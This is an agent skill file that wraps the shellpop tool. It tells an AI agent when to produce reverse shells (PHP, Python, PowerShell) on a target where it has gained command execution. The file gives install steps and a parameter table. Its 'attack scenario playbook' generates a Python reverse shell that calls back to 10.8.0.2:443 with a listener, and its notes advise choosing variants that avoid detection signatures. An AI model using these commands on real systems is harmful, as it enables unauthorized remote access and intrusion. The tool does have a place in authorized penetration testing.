---
name: shellpop-shell-gen
description: "shellpop: selects optimal reverse shells for restricted environments. Signals: webshell, rce, list all payloads, generate PS reverse, Python reverse."
zh-signals: "shellpop: 受限环境选最优反弹方式。信号:webshell,rce,列全部 payload,生成 PS 反弹,Python 反弹。"
when-to-use: >-
  Use when you have command execution in a restricted environment and need to
  generate a reverse shell in the language available on the target (PHP, Python,
  PowerShell, etc.); can also start a handler.
---

# shellpop

- Attack Category: C13 Remote Command Execution and WebShell
- Upstream Repository: https://github.com/0x00-0x00/shellpop
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/0x00-0x00/shellpop && cd shellpop && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `shellpop --list` | List all payloads |
| `shellpop --payload windows/reverse/tcp/powershell --host x --port 443` | Generate a PowerShell reverse shell |
| `shellpop --payload linux/reverse/tcp/python --host x --port 443` | Python reverse shell |
| `--handler` | Start a listener at the same time |

## Attack Scenario Playbook

### Picking the optimal reverse shell for a restricted environment

```bash
shellpop --list | grep -i 'php\|python'
shellpop --payload linux/reverse/tcp/python --host 10.8.0.2 --port 443 --handler
```

## Notes

Aggregates reverse shell one-liners for 20+ languages; use the matching variant when the target has python/perl/php to avoid the signature of a bare sh shell.
